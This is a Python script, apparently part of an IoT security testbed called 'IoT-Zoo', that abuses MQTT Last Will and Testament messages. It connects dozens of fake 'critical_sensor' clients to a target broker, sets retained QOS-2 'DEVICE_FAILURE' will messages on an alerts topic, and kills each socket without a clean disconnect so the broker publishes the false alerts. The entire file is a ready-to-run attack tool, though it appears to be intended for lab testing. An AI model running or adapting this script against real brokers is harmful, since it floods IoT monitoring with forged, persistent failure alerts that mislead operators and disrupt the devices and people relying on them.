#!/usr/bin/env python3
"""Controlled MQTT Last-Will abuse generator for IoT-Zoo.

Each fake client connects with an LWT message and then closes the TCP socket
without sending a graceful MQTT DISCONNECT. This is intentionally different from
client.disconnect(), because a clean disconnect does not trigger the broker's
Last Will and Testament publication.
"""

import json
import os
import socket
import sys
import time
from typing import Any

import paho.mqtt.client as mqtt


def _env_int(name: str, default: int) -> int:
    try:
        return int(os.getenv(name, str(default)))
    except ValueError:
        return default


def _env_bool(name: str, default: bool) -> bool:
    value = os.getenv(name)
    if value is None:
        return default
    return value.strip().lower() in {"1", "true", "yes", "on"}


def _close_abruptly(client: mqtt.Client) -> None:
    """Close the MQTT socket without sending DISCONNECT.

    paho-mqtt keeps the socket in a private attribute; using it here is
    deliberate because the attack semantics require an ungraceful disconnect.
    """
    sock: Any = getattr(client, "_sock", None)
    if sock is not None:
        try:
            sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            sock.close()
        except OSError:
            pass
    close_fn = getattr(client, "_sock_close", None)
    if callable(close_fn):
        try:
            close_fn()
        except Exception:
            pass


def run_one(broker: str, port: int, idx: int, *, qos: int, retain: bool, topic: str, prefix: str, timeout_s: int) -> bool:
    client_id = f"{prefix}_{idx}"
    client = mqtt.Client(client_id=client_id, clean_session=True)
    payload = json.dumps({"device": client_id, "status": "DEVICE_FAILURE", "battery": 0, "source": "iotzoo_lwt_abuse"})
    client.will_set(topic, payload, qos=qos, retain=retain)
    try:
        client.connect(broker, port, keepalive=5)
        client.loop_start()
        time.sleep(max(0.05, min(float(timeout_s), 1.0)))
        _close_abruptly(client)
        client.loop_stop()
        print(f"[attack] lwt_triggered client={client_id}", flush=True)
        return True
    except Exception as exc:  # keep attack running even when some attempts fail
        try:
            client.loop_stop()
        except Exception:
            pass
        print(f"[attack] lwt_failed client={client_id} error={exc}", flush=True)
        return False


def main() -> int:
    broker = sys.argv[1] if len(sys.argv) > 1 else os.getenv("TARGET_IP", "localhost")
    port = int(sys.argv[2] if len(sys.argv) > 2 else os.getenv("TARGET_PORT", "1883"))
    count = _env_int("COUNT", 30)
    delay_ms = _env_int("DELAY_MS", 100)
    qos = _env_int("QOS", 2)
    retain = _env_bool("RETAIN", True)
    topic = os.getenv("TOPIC", "alerts/device/failure")
    prefix = os.getenv("CLIENT_PREFIX", "critical_sensor")
    timeout_s = _env_int("CONNECT_TIMEOUT_S", 3)

    sent = 0
    failed = 0
    for i in range(count):
        if run_one(broker, port, i, qos=qos, retain=retain, topic=topic, prefix=prefix, timeout_s=timeout_s):
            sent += 1
        else:
            failed += 1
        if delay_ms > 0:
            time.sleep(delay_ms / 1000.0)

    print(f"[attack] mqtt_lwt_abuse summary sent={sent} failed={failed}", flush=True)
    return 0 if sent > 0 else 2


if __name__ == "__main__":
    raise SystemExit(main())
